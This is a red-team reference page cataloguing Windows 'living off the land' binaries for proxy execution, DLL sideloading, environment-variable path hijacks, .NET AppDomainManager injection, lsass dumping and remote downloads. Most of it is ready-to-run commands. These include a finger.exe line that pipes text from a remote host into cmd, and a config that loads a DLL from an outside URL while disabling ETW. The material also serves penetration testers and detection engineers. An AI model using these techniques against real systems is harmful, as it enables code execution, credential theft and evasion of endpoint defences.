<!---------------------------------------------------------------------------------
Copyright: (c) BLS OPS LLC.
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, version 3.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program. If not, see <https://www.gnu.org/licenses/>.
--------------------------------------------------------------------------------->
# LOLBins ([`Signed Binary Proxy Execution` TTP](TTP/T1218_Signed_Binary_Proxy_Execution/T1218.md))
### Tags
<details><summary>Tags (Click to expand)</summary><p>

Environment

		#@Windows #@microsoft

Context

		#@lolbin #@lolbas #@lolbins #@lol #@download #@execute #@execution #@exec #@bypass #@EDR #@av #@arbitrary 

Tools

		#@procmon #@process #@monitor #@onedrive #@teams #@certoc.exe #@wuauclt #@format.com #@format #@msra.exe #@msra #@certutil #@control.exe #@CMSTP.exe #@Mshta #@Msiexec #@Odbcconf #@Regsvcs-Regasm #@regsvcs #@Regasm #@Regsvr32 #@Rundll32 #@Verclsid #@PubPrn #@fvenotify #@fvenotify.exe #@finger.exe #@finger #@Symantec #@SSHelper #@createdump #@createdump.exe #@procdump 


</p></details>

### References
* LOLBins Project -<br />[https://lolbas-project.github.io/](https://lolbas-project.github.io/)
	* LOLBINs or "Living off the land binaries" are used to get execution/downloads/TTPs on a local system. Two famous LOLbins are MSBuild and CSC which allow operators to get execution on the local system by executing raw source code (C#).

### Examples

* [Search Order Abuse Guide](Testaments_and_Books/Redvelations/Windows/002-5_Search_Order_Abuse.md)
* Compile Shellcode on target
	* MSBuild ([Windows Reverse Shells Guide](Testaments_and_Books/Redvelations/Windows/004-1_Windows_Reverse_Shells.md))
* Arbitrary DLLs
	* <details><summary>onedrive (Click to expand)</summary><p>
		* Overview, Requirements
			* THIS WILL DELETE `ONEDRIVE.EXE`
		* Process
			1. Create a backup copy of the victim's onedrive.exe
			1. Drop MSASN1.dll into `C:\Users\<user>\AppData\Local\Microsoft\OneDrive`
	* <details><summary>wuauclt (Click to expand)</summary><p>
		* <details><summary>Overview (Click to expand)</summary><p>
			* wuauclt.exe is a Microsoft signed binary that requires a DLL with specific exported functions, specifically: 
		* <details><summary>Requirements (Click to expand)</summary><p>
			* DLL with the exported functions:
				1. `DownloadManager`
				1. `DataStore`
		* Examples
			* Splinternet compatible (See also: Requirements)

					C:\Windows\System32\wuauclt.exe /UpdateDeploymentProvider C:\users\user1\Desktop\localdll.dll /RunHandlerComServer
	* <details><summary>certoc.exe (Click to expand)</summary><p>
		* <details><summary>References (Click to expand)</summary><p>
			* [https://twitter.com/sblmsrsn/status/1445758411803480072](https://twitter.com/sblmsrsn/status/1445758411803480072)
		* <details><summary>Overview (Click to expand)</summary><p>
			* Does not appear to require elevated privileges
			* Might mainly be a lolbin for Server OS variants
			* It looks like an alternative lolbin to regsvr32
		* Examples

				C:\Windows\System32\certoc.exe -LoadDLL <DLLName>
	* <details><summary>format.com utility (Click to expand)</summary><p>
		* <details><summary>References (Click to expand)</summary><p>
			* [https://twitter.com/0gtweet/status/1477925112561209344](https://twitter.com/0gtweet/status/1477925112561209344)
			* [https://twitter.com/wdormann/status/1478011052130459653](https://twitter.com/wdormann/status/1478011052130459653)
		* <details><summary>Overview (Click to expand)</summary><p>
			* `/FS:FILESYSTEM` parameter - the resulting process will try to load ("U"+FILESYSTEM).DLL using the default search path.
			* Not a COM file (name may be maintained for something like backward-compatibility)
			* Example Search Order
				* `C:\Windows\System32\FILE.DLL`
				* `C:\Windows\System\FILE.DLL`
				* `C:\Window\FILE.DLL`
				* `C:\tmp\FILE.DLL`
		* Examples
			* Example 1: Basic use

					format a: /fs:calc
			* Example 2: Bypass the "U" requirement (specify arbitrary DLLs)

					format a: /fs:\..\calc
* Arbitrary exe
	* <details><summary>msra.exe (Click to expand)</summary><p>
		* Overview, Requirements
			* `x64` only; attack takes advantage of the arch switching that happens with this particular lolbin
			* LOLBIN (msra.exe) is deleted after execution
		* Process
			1. transfer malicious exe called `msra.exe` to target
			2. place in user-controlled folder
			3. create folder named `system32`
			4. move malicious `msra.exe` to newly created system32 folder
			5. Set windir to parent folder of the new system32 folder

					cmd /c set windir=<parent folder of system32>
			6. Execute the msra.exe

					cmd /c c:\windows\syswow64\msra.exe
	* <details><summary>.NET (Click to expand)</summary><p>
		* <details><summary>Example 1 (Click to expand)</summary><p>
			* <details><summary>References (Click to expand)</summary><p>
				* GIST -<br />[https://github.com/TheWover/GhostLoader/blob/master/uevmonitor.cs](https://github.com/TheWover/GhostLoader/blob/master/uevmonitor.cs)
				* PentestLabs -<br />[https://pentestlaboratories.com/2020/05/26/appdomainmanager-injection-and-detection/](https://pentestlaboratories.com/2020/05/26/appdomainmanager-injection-and-detection/)
			* <details><summary>Overview (Click to expand)</summary><p>
				* .
			* Process
				1. Copy a `.NET` Binary into a user controlled directory
					* `%AppProfile%` 
					* `C:\Users\Public\Downloads`
				1. Compile

						C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:library /out:uevmonitor.dll type.cs
						set APPDOMAIN_MANAGER_ASM=uevmonitor, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
						set APPDOMAIN_MANAGER_TYPE=MyAppDomainManager
						set COMPLUS_Version=v4.0.30319
				1. Write out the `BinaryName.exe.config` file
					* [Example](Testaments_and_Books/Redvelations/Windows/Payloads/Arbitrary_dotnet.exe.config)
				1. Write out a DLL file compiled specifically for getting a call back
					* [Example](Testaments_and_Books/Redvelations/Windows/Payloads/)
	* <details><summary>mpiexec.exe (Click to expand)</summary><p>
		* <details><summary>References (Click to expand)</summary><p>
			* [https://twitter.com/mrd0x/status/1465058133303246867](https://twitter.com/mrd0x/status/1465058133303246867)
		* <details><summary>Overview (Click to expand)</summary><p>
			* Early tests apear to not have this binary available by default on a Windows Workstation
		* Examples

				mpiexec.exe -n 1 c:\path\to\binary.exe
	* <details><summary>Search Order Abuse (Click to expand)</summary><p>
		* `Workfolders.exe` (a signed Microsoft application) 
			* Looks for `control.exe` ([`Signed Binary Proxy Execution - Control Panel` TTP](TTP/T1218_Signed_Binary_Proxy_Execution/002_Control_Panel/T1218.002.md))
			* can be called from anywhere, it’s in system32
		* `iediagcmd.exe`
			* Looks for
				* `ipconfig.exe`
				* `route.exe`
				* `netsh.exe`
				* `makecab.exe`
			* Requires full path for calling
				* Win10: `C:\Program Files\Internet Explorer\iediagcmd.exe`
			* Bypass need for CMD
				1. Create LNK File
				1. Specify the "starts in" directory to the folder containing the exe/dll
				* "Quite handy on a lockdown job to bypass awl"
		* 3rd party apps
			* Keybase for Windows
				* Looks for `cmd.exe` (and others), this resides in C:\User\Username\Local\Keybase\Gui\keybase.exe 
			* Signal Messenger (Windows Desktop)
				* Looks for `wmic.exe`
			* Slack 
				* looks for `reg.exe` (silently fixed)
		* chcp.com ([TTP](TTP/T1218_Signed_Binary_Proxy_Execution/T1218_chcp.com.md))

* Execution
	* <details><summary>wlrmdr (Click to expand)</summary><p>
		* <details><summary>References (Click to expand)</summary><p>
			* [https://twitter.com/falsneg/status/1461625526640992260](https://twitter.com/falsneg/status/1461625526640992260)
		* Examples

				wlrmdr -s 0 -f 0 -t 0 -m 0 -a 11 -u calc.exe
	* <details><summary>tttracer.exe (Click to expand)</summary><p>
		* <details><summary>References (Click to expand)</summary><p>
			* [https://twitter.com/0gtweet/status/1397127604281479168](https://twitter.com/0gtweet/status/1397127604281479168)
		* Parameters
			* `-DeleteTraceFilesOnExit` - Less Verbose
		* Examples
			* Example 1

					tttracer.exe -launch calc.exe
	* <details><summary>ttdinject.exe (Click to expand)</summary><p>
		* <details><summary>References (Click to expand)</summary><p>
			* [https://twitter.com/0gtweet/status/1397199297314267138](https://twitter.com/0gtweet/status/1397199297314267138)
		* Examples
			* Example 1

					ttdinject.exe /injectmode LoaderForEmulator /launch calc.exe
	* <details><summary>unregmp2.exe (Click to expand)</summary><p>
		* <details><summary>References (Click to expand)</summary><p>
			* [https://twitter.com/notwhickey/status/1466588365336293385](https://twitter.com/notwhickey/status/1466588365336293385)
		* <details><summary>Overview (Click to expand)</summary><p>
			* Has been around for a while and likely caught by EDR.
		* Examples
			* Example 1: pop a calc

					rmdir %temp%\lolbin /s /q 2>nul & mkdir "%temp%\lolbin\Windows Media Player" & copy C:\Windows\System32\calc.exe "%temp%\lolbin\Windows Media Player\wmpnscfg.exe" >nul && cmd /V /C "set "ProgramW6432=%temp%\lolbin" && unregmp2.exe /HideWMP"
	* <details><summary>dvdplay.exe (Click to expand)</summary><p>
		* <details><summary>References (Click to expand)</summary><p>
			* [https://twitter.com/0gtweet/status/1414904440696496128](https://twitter.com/0gtweet/status/1414904440696496128)
		* <details><summary>Overview/Notes (Click to expand)</summary><p>
			* dvdplay.exe actually does three simple things:
				1. reads the registry with RegGetValue()
				2. finds the exe from #1 using SearchPath()
				3. creates new process using CreateProcess(), exe from #2, and "/device:dvd" parameter.
				* Default registry value: `REG_EXPAND_SZ`
		* Examples
			* Example 1

					set ProgramFiles(x86)=c:\users\vx\test
					mkdir 'Windows Media Player'
					move bad.exe 'Windows Media Player'\bad.exe
					dvdplay
				* Example Output

						9:32:52.2087664 AM dvdplay.exe 23968 CreateFile C:\users\alex\desktop\cmdtest\Windows Media Player\wmplayer.exe PATH NOT FOUND Desired Access: Read Attributes, Disposition: Open, Options: Open Reparse Point, Attributes: n/a, ShareMode: Read, Write, Delete, AllocationSize: n/a
			* Example 2

					kali@kali~$ ./cog.sh exe payload.bin wmplayer.exe
					kali@kali~$ zip -r 'Windows Media Player.zip' wmplayer.exe


					WINDOWS
					<transfer .zip to target, using cmd.exe for following commands>
					powershell -c Expand-Archive 'Windows Media Player.zip'
					set ProgramFiles(x86)=<current dir>
					dvdplay
	* control.exe ([`Signed Binary Proxy Execution - Control Panel` TTP](TTP/T1218_Signed_Binary_Proxy_Execution/002_Control_Panel/T1218.002.md))
	* CMSTP.exe ([`Signed Binary Proxy Execution - CMSTP` TTP](TTP/T1218_Signed_Binary_Proxy_Execution/003_CMSTP/T1218.003.md))
	* Mshta ([`Signed Binary Proxy Execution - Mshta` TTP](TTP/T1218_Signed_Binary_Proxy_Execution/005_Mshta/T1218.005.md))
	* Msiexec ([`Signed Binary Proxy Execution - Msiexec` TTP](TTP/T1218_Signed_Binary_Proxy_Execution/007_Msiexec/T1218.007.md))
	* Odbcconf ([`Signed Binary Proxy Execution - Odbcconf` TTP](TTP/T1218_Signed_Binary_Proxy_Execution/008_Odbcconf/T1218.008.md))
	* Regsvcs-Regasm ([`Signed Binary Proxy Execution - Regsvcs-Regasm` TTP](TTP/T1218_Signed_Binary_Proxy_Execution/009_Regsvcs-Regasm/T1218.009.md))
	* Regsvr32 ([`Signed Binary Proxy Execution - Regsvr32` TTP](TTP/T1218_Signed_Binary_Proxy_Execution/010_Regsvr32/T1218.010.md))
	* Rundll32 ([`Signed Binary Proxy Execution - Rundll32` TTP](TTP/T1218_Signed_Binary_Proxy_Execution/011_Rundll32/T1218.011.md))
	* Verclsid ([`Signed Binary Proxy Execution - Verclsid` TTP](TTP/T1218_Signed_Binary_Proxy_Execution/012_Verclsid/T1218.012.md))
	* PubPrn ([`Signed Script Proxy Execution - PubPrn` TTP](TTP/T1216_Signed_Script_Proxy_Execution/001_PubPrn/T1216.001.md))
	* Compiled HTML File ([`Signed Binary Proxy Execution - Compiled HTML File` TTP](TTP/T1218_Signed_Binary_Proxy_Execution/001_Compiled_HTML_File/T1218.001.md))
* Forced Authentication
	* fvenotify.exe ([AD Relay/Capture Guide](Testaments_and_Books/Redvelations/Active_Directory/003-1_AD_Capture_and_Relay_Attacks.md)), ([`Forced Authentication` TTP](TTP/T1187_Forced_Authentication/T1187.md))
* Download
	* certutil.exe ([`Signed Binary Poxy Execution - CertUtil` TTP](TTP/T1218_Signed_Binary_Proxy_Execution/T1218_certutil.md))
	* <details><summary>finger.exe (Click to expand)</summary><p>
		* <details><summary>References (Click to expand)</summary><p>
			* [https://twitter.com/DissectMalware/status/997340270273409024](https://twitter.com/DissectMalware/status/997340270273409024)
			* [https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/ff961508(v=ws.11)](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/ff961508(v=ws.11)
		* Example

				finger user@example.host.com | more +2 | cmd
* lsass dump
	* <details><summary>createdump.exe (Click to expand)</summary><p>
		* <details><summary>References (Click to expand)</summary><p>
			* [https://twitter.com/bopin2020/status/1366400799199272960](https://twitter.com/bopin2020/status/1366400799199272960)
		* <details><summary>Requirements (Click to expand)</summary><p>
			* CONFIRM: `.NET5`
			* CONFIRM: SYSTEM (not admin)
		* Examples
			* Example 1

					C:\Program Files\dotnet\shared\http://Microsoft.NETCore.App\5.x.x\createdump.exe
	* <details><summary>ProcDump (Click to expand)</summary><p>
		* <details><summary>References (Click to expand)</summary><p>
			* [https://twitter.com/ajpc500/status/1448588362382778372](https://twitter.com/ajpc500/status/1448588362382778372)
		* `-md` flag of procdump launches arbitrary DLLs, one of two ways
			* `DLL_PROCESS_ATTACH` - msfvenom calc example
			* Exporting a `MiniDumpCallbackRoutine` function - also produces a dump file (beacon example)
* <details><summary>Global Assembly Cache Hijack (Click to expand)</summary><p>
	* <details><summary>References (Click to expand)</summary><p>
		* [https://bohops.com/2021/05/30/abusing-and-detecting-lolbin-usage-of-net-development-mode-features/](https://bohops.com/2021/05/30/abusing-and-detecting-lolbin-usage-of-net-development-mode-features/)
		* There is BLS Project that is tracking different .NET Binaries and targeted DLL names.
	* <details><summary>Requirements (Click to expand)</summary><p>
		* Configuration file (Sample below) in the same directory as the .NET Binary we want to use (similar to the attack above)
	* Process
		1. Create malicious file
			* [Example Config](Testaments_and_Books/Redvelations/Windows/Payloads/Global_Assembly_Cache.config)
		1. Set environment variable (Environmental Variable Set: devpath)
* <details><summary>LOLBINs not installed by default (Click to expand)</summary><p>
	* <details><summary>Symantec SSHelper (Click to expand)</summary><p>
		* <details><summary>References (Click to expand)</summary><p>
			* [https://nasbench.medium.com/symantec-endpoint-protection-meets-com-using-symantec-sshelper-as-a-lolbin-40d515a121ce](https://nasbench.medium.com/symantec-endpoint-protection-meets-com-using-symantec-sshelper-as-a-lolbin-40d515a121ce)
		* Parameters
			* `file_path` that indicates the location of the executable to be run.
			* `params` which represents the parameters to be passed to the file that is going to be executed.
			* `bshow` is a boolean representing if we want to show a window or not.
		* Examples
			* Example 1: "Pop calc"

					$(New-Object -com "Symantec.SSHelper").Run(0, "calc", "", $False, 0, $True);
			* Example 2: "Pop calc"

					$(New-Object -com "Symantec.SSHelper").RunEx(0, "calc", "", $True, 0, $True, $True);

### Needs Research/Testing
* <details><summary>Needs Research (Click to expand)</summary><p>
	* <details><summary>File Share + Alternate Data Stream (Click to expand)</summary><p>
		* <details><summary>References (Click to expand)</summary><p>
			* [https://twitter.com/aaaddress1/status/1442380993172701186](https://twitter.com/aaaddress1/status/1442380993172701186)
			* [https://docs.microsoft.com/en-us/sysinternals/downloads/streams](https://docs.microsoft.com/en-us/sysinternals/downloads/streams)
		* Examples
			* Example 1

					echo > c:\users\public\downloads\file.txt
					type badfile h:\badfile.dll > c:\users\public\downloads\file.txt:calc
	    			rundll32 "c:\users\public\downloads\file.txt:calc",DllMain
	* <details><summary>DEVPATH (Click to expand)</summary><p>
		* <details><summary>References (Click to expand)</summary><p>
			* [https://bohops.com/2021/05/30/abusing-and-detecting-lolbin-usage-of-net-development-mode-features/](https://bohops.com/2021/05/30/abusing-and-detecting-lolbin-usage-of-net-development-mode-features/)
			* [https://bohops.com/2021/03/16/investigating-net-clr-usage-log-tampering-techniques-for-edr-evasion/](https://bohops.com/2021/03/16/investigating-net-clr-usage-log-tampering-techniques-for-edr-evasion/)
			* [https://docs.microsoft.com/en-us/dotnet/framework/configure-apps/how-to-locate-assemblies-by-using-devpath](https://docs.microsoft.com/en-us/dotnet/framework/configure-apps/how-to-locate-assemblies-by-using-devpath)
		* Process Overview
			1. Prepare a configuration file following this general format

					<configuration>
					  <runtime>
					    <developmentMode developerInstallation="true"/>
					  </runtime>
					</configuration>
			1. Set and environment variable `DEVPATH` to a value that points to a file system directory path
				* When set, the CLR attempts to "resolve" the target assembly dependencies in the path before locating the "unfound" assemblies in the GAC (which is the default behavior).
		* Examples/Commands
			* Example 1
				* UevAppMonitor.exe
					* <details><summary>Overview (Click to expand)</summary><p>
						* Has an application configuration filed located in the System32 directory (`UevAppMonitor.exe.config`)
					* Modify a copy of the configuration file to include the lines described in the above overview.
						* Normal (`type UevAppMonitor.exe.config`)

								<?xml version="1.0" encoding="utf-8" ?>
								  <configuration>
								    <startup>
								      <supportedRuntime version="v4.0" />
								    </startup>
								  </configuration>
						* Modified

								<?xml version="1.0" encoding="utf-8" ?>
								  <configuration>
								    <startup>
								      <supportedRuntime version="v4.0" />
								    </startup>
								    <runtime>
								      <developmentMode developerInstallation="true"/>
								    </runtime>
								  </configuration>
					* Store in a temporary directory.
	* <details><summary>SystemRoot Technique (Click to expand)</summary><p>
		* <details><summary>References (Click to expand)</summary><p>
			* [https://twitter.com/0gtweet/status/1401618571143303169](https://twitter.com/0gtweet/status/1401618571143303169)
		* Examples/Commands
			* Example 1

					set SystemRoot=c:\temp\customshell
					dir %SystemRoot%\System32
					CustomShellHost.exe
	* <details><summary>Potential Download LOLBIN 1 (Click to expand)</summary><p>
		* <details><summary>References (Click to expand)</summary><p>
			* [https://twitter.com/JohnLaTwC/status/1411754075398443009](https://twitter.com/JohnLaTwC/status/1411754075398443009)
			* [https://www.sentinelone.com/labs/purple-fox-ek-new-cves-steganography-and-virtualization-added-to-attack-flow/](https://www.sentinelone.com/labs/purple-fox-ek-new-cves-steganography-and-virtualization-added-to-attack-flow/)
		* <details><summary>Overview (Click to expand)</summary><p>
			* Figure out what object System.Drawing is, we could have  another LOLBIN for a download
			* Search for `.Assembly.GetType` in command line data. You might find a malicious PowerShell command line attempting an AMSI bypass
	* <details><summary>ImageView_PrintTo (Click to expand)</summary><p>
		* <details><summary>References (Click to expand)</summary><p>
			* [https://twitter.com/Hexacorn/status/1469083453325037575](https://twitter.com/Hexacorn/status/1469083453325037575)
		* <details><summary>Overview (Click to expand)</summary><p>
			* `ImageView_PrintTo` insecurely calls `LoadLibraryW` for `UsePPWForPrintTo`
		* Process
			1. create dummy file (foo)
			1. copy rundll32.exe to c:\test\rundll32.exe
			1. copy DLL payload to c:\test\photowiz.dll
			1. run rundll32

					rundll32 c:\WINDOWS\system32\shimgvw.dll,ImageView_PrintTo c:\test\foo
				* ImageView_PrintToA & ImageView_PrintToW should work too (W needs Unicode tho)
	* <details><summary>Remote Downloading DLL (Click to expand)</summary><p>
		* <details><summary>References (Click to expand)</summary><p>
			* [https://twitter.com/MrUn1k0d3r/status/1481641789555572737](https://twitter.com/MrUn1k0d3r/status/1481641789555572737)
		* <details><summary>Requirements (Click to expand)</summary><p>
			* A strong signed binary (certificate signing)
		* Here is the App.config requirement.

				<configuration>
				     <runtime>
				          <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
				               <dependentAssembly>
				                    <assemblyIdentitiy name="malicious" publicKeyToken="ff4d601c1484a445" culture="neutral" />
				                    <codeBase version="0.0.0.0" href="https://some.tld.com/getme.dll"/>
				               </dependentAssembly>
				          </assemblyBinding>
				          <etwEnable enabled="false">
				          <appDomainManagerAssembly value ="malicious, Version=0.0.0.0, Culture=neutral, PublicKeyToken=ff4d601c1484a445" />
				          <AppDomainManagerType value="Updater" />
				     </runtime>
				</configuration>
	* MSXSL ([`XSL Script Processing` TTP](TTP/T1220_XSL_Script_Processing/T1220.md))
		* <details><summary>References (Click to expand)</summary><p>
			* [https://lolbas-project.github.io/lolbas/OtherMSBinaries/Msxsl/](https://lolbas-project.github.io/lolbas/OtherMSBinaries/Msxsl/)
		* Examples
			* Example 1: Run COM Scriptlet code within the script.xsl file (local)

					msxsl.exe customers.xml script.xsl




